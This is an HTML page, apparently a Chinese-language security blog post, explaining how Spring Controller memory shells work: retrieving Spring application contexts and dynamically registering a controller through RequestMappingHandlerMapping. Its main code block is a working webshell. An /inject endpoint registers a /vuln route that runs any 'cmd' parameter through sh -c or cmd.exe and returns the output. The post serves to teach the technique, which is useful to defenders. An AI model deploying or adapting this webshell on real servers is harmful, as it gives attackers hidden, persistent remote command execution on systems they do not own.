@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言Spring是一个开源容器框架，其核心就是控制反转（IOC）和面向切面（AOP）。Spring作为Java框架，核心组件为Core、Context和Bean，使用Spring的主要一个原因就是Spring会把对象之间的依赖关系转而用配置文件来管理，也就是依赖注入机制。  Bean组件：Bean是Spring核心中的重点，Bean组件在Spring的org.springframework.bea">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring MemoryShell Of Controller">
+<meta property="og:url" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/index.html">
+<meta property="og:site_name" content="H3rmesk1t">
+<meta property="og:description" content="前言Spring是一个开源容器框架，其核心就是控制反转（IOC）和面向切面（AOP）。Spring作为Java框架，核心组件为Core、Context和Bean，使用Spring的主要一个原因就是Spring会把对象之间的依赖关系转而用配置文件来管理，也就是依赖注入机制。  Bean组件：Bean是Spring核心中的重点，Bean组件在Spring的org.springframework.bea">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/1713416564663-d25202a8-17fc-4749-8d26-7af92184bfbe.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/1713419026876-d1d87036-a5e1-449d-8044-7c95bb9569a4.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/1713418210868-7df74227-dcde-4880-9b0e-e3fb61197922.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/1713419338309-177e3657-8e6e-4a17-9d7a-5e1a9d7b7b1e.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/1713421598568-61c5ec79-cd86-445b-95fe-d590c2043894.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/1713421666603-5a9947d5-83c1-44ca-84ec-41f851ca7635.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/1713422496592-6e0479f9-abc0-4bfc-9191-cee742bd0a82.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/1713493654995-1d7b2350-c810-4c90-8b70-b3f5d3aeb13d.png">
+<meta property="article:published_time" content="2024-05-18T16:40:00.000Z">
+<meta property="article:modified_time" content="2024-10-18T07:26:50.409Z">
+<meta property="article:author" content="H3rmesk1t">
+<meta property="article:tag" content="MemoryShell">
+<meta property="article:tag" content="Spring">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/1713416564663-d25202a8-17fc-4749-8d26-7af92184bfbe.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/my-logo-mosaic.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/my-logo-mosaic-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/my-logo-mosaic.png">
+        
+      
+    
+    <!-- title -->
+    <title>Spring MemoryShell Of Controller</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="H3rmesk1t" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/19/Spring-Interceptor/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/18/Tomcat-Valve/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&text=Spring MemoryShell Of Controller"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&is_video=false&description=Spring MemoryShell Of Controller"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring MemoryShell Of Controller&body=Check out this article: https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&name=Spring MemoryShell Of Controller&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&t=Spring MemoryShell Of Controller"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">过程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8CContext"><span class="toc-number">3.1.</span> <span class="toc-text">注册Context</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Root-Context"><span class="toc-number">3.1.1.</span> <span class="toc-text">Root Context</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Child-Context"><span class="toc-number">3.1.2.</span> <span class="toc-text">Child Context</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8CController"><span class="toc-number">3.2.</span> <span class="toc-text">注册Controller</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">注册流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">动态注入</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Spring MemoryShell Of Controller
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">H3rmesk1t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-18T16:40:00.000Z" class="dt-published" itemprop="datePublished">2024-05-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/MemoryShell/" rel="tag">MemoryShell</a>, <a class="p-category" href="/tags/Spring/" rel="tag">Spring</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring是一个开源容器框架，其核心就是控制反转（IOC）和面向切面（AOP）。Spring作为Java框架，核心组件为Core、Context和Bean，使用Spring的主要一个原因就是Spring会把对象之间的依赖关系转而用配置文件来管理，也就是依赖注入机制。</p>
+<ul>
+<li>Bean组件：Bean是Spring核心中的重点，Bean组件在Spring的org.springframework.beans包下，在这个包下的所有类主要解决了3件事，Bean的定义、创建及解析。</li>
+<li>Context组件：Context又叫IOC容器，Context组件在Spring的org.springframework.context包下，给Spring提供一个运行时的环境，用于保存各个对象的状态。</li>
+<li>Core组件：Core为处理对象间关系的方法，作为Spring的核心组件，其中包含了很多关键类，例如，定义资源的访问方式。</li>
+</ul>
+<p>SpringMVC是一种WEB层MVC框架，用于替代Servlet。在SpringMVC框架中，DispatcherServlet负责分发请求到控制器Controller进行处理，Controller则把用户的请求数据经过业务层处理后封装成一个ModelAndView对象，然后再把该对象返回给对应的View进行展示。在SpringMVC中定义一个Controller是非常简单的，不需要继承特定的类，也不需要实现相关接口，只需使用@Controller注解在一个类上进行标记即可。然后使用@RequestMapping等一些注解用定义URL请求和映射，这样Controller就能被访问。</p>
+<p>而Spring内存马一般的构造方式就是模拟组件注册，从而来注入恶意组件，Spring Controller型内存马就是通过动态注册Controller来实现的。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>新建Spring项目，设置Server URL为<a target="_blank" rel="noopener" href="https://start.aliyun.com/%E3%80%82">https://start.aliyun.com/。</a></p>
+<p><img src="/2024/05/19/Spring-Controller/1713416564663-d25202a8-17fc-4749-8d26-7af92184bfbe.png" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello Contoller...&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><h3 id="注册Context"><a href="#注册Context" class="headerlink" title="注册Context"></a>注册Context</h3><p>在之前分析Tomcat型内存马和中间件型内存马时，要成功打入内存马，一个很重要的点就是先获取当前运行环境的上下文，在Spring应用中可以同时有多个Context，但其中只有一个Root Context，其余的均为Child Context，所有Child Context都可以访问在Root Context中定义的Bean，但是Root Context无法访问Child Context中定义的Bean，并且所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。</p>
+<h4 id="Root-Context"><a href="#Root-Context" class="headerlink" title="Root Context"></a>Root Context</h4><ul>
+<li>ContextLoader#getCurrentWebApplicationContext方法，Root Context是由ContextLoaderListener触发监听后ContextLoader所创建，因此，ContextLoader类中也相应的获取方法，即getCurrentWebApplicationContext方法。</li>
+</ul>
+<p><img src="/2024/05/19/Spring-Controller/1713419026876-d1d87036-a5e1-449d-8044-7c95bb9569a4.png" alt="image.png"></p>
+<ul>
+<li>WebApplicationContextUtils#getWebApplicationContext方法，由于所有的Context在创建后，都会被作为一个属性添加到了ServletContext中，因此，可以借助servletContext来获取Root Context。</li>
+</ul>
+<p><img src="/2024/05/19/Spring-Controller/1713418210868-7df74227-dcde-4880-9b0e-e3fb61197922.png" alt="image.png"></p>
+<ul>
+<li>ApplicationContext#getAttribute，ApplicationContext实现了ServletContext接口，getAttribute方法通过传入名称来获取上下文。</li>
+</ul>
+<p><img src="/2024/05/19/Spring-Controller/1713419338309-177e3657-8e6e-4a17-9d7a-5e1a9d7b7b1e.png" alt="image.png"></p>
+<h4 id="Child-Context"><a href="#Child-Context" class="headerlink" title="Child Context"></a>Child Context</h4><ul>
+<li>RequestContextUtils#getWebApplicationContext：，在request中存放着Child Context，因此可以借助request来获取Child Context，但是在较新Spring版本中已没有getWebApplicationContext方法。</li>
+<li>Request#getAttribute，同样是借助request来获取Child Context，不过这里利用的是getAttribute方法。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Root WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Root WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext</span></span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="literal">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure>
+
+<h3 id="注册Controller"><a href="#注册Controller" class="headerlink" title="注册Controller"></a>注册Controller</h3><ul>
+<li>Spring 2.5开始到Spring 3.1之前一般使用org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping映射器</li>
+<li>Spring 3.1开始及以后一般开始使用新的org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping映射器来支持@Contoller和@RequestMapping注解</li>
+</ul>
+<p>在org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping中存在方法registerMapping，其会调用父类的registerMapping方法，然后调用register方法完成注册。</p>
+<p><img src="/2024/05/19/Spring-Controller/1713421598568-61c5ec79-cd86-445b-95fe-d590c2043894.png" alt="image.png"></p>
+<p><img src="/2024/05/19/Spring-Controller/1713421666603-5a9947d5-83c1-44ca-84ec-41f851ca7635.png" alt="image.png"></p>
+<p><img src="/2024/05/19/Spring-Controller/1713422496592-6e0479f9-abc0-4bfc-9191-cee742bd0a82.png" alt="image.png"></p>
+<h3 id="注册流程"><a href="#注册流程" class="headerlink" title="注册流程"></a>注册流程</h3><p>在registerMapping方法中存在三个参数，分别为handler、method和mapping。</p>
+<ul>
+<li>handler：需要构造的controller对应的类</li>
+<li>method：需要注册的controller中的方法</li>
+<li>mapping：RequestMappingInfo类型的，设置Controller的一些请求参数的，若没有特殊要求全填null即可<br>java<br>&#x2F;&#x2F; handler<br>InjectToController injectToController &#x3D; new InjectToController();<br>&#x2F;&#x2F; method<br>Method method &#x3D; InjectToController.class.getMethod(“vuln”);<br>&#x2F;&#x2F; mapping<br>RequestMappingInfo info &#x3D; new RequestMappingInfo(null, null, null, null, null, null, null);</li>
+</ul>
+<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>动态注册Spring Controller内存马的具体思路如下：</p>
+<ul>
+<li>获取Context</li>
+<li>获取RequestMappingHandlerMapping</li>
+<li>获取MappingRegistry属性</li>
+<li>构造RequestMappingInf</li>
+<li>调用MappingRegistry#register方法注册Controller</li>
+</ul>
+<h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 适用于Springboot &lt; 2.6.0环境, 从Springboot 2.6.0版本开始, 官方修改了url路径的默认匹配策略</span></span><br><span class="line"><span class="comment"> * 需要通过application.properties配置文件设置spring.mvc.pathmatch.matching-strategy的值为ant_path_matcher</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringControllerMemShell1</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/inject&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">TestController</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取上下文环境</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 通过上下文获取RequestMappingHandlerMapping</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="comment">// 获取恶意类的恶意方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">vulnMethod</span> <span class="operator">=</span> VulnController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义访问恶意Controller的url</span></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/vuln&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义允许访问恶意controller的HTTP请求方法（GET/POST）</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">condition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 动态注册Controller</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, condition, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">VulnController</span> <span class="variable">vulnController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnController</span>();</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, vulnController, vulnMethod);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnController</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    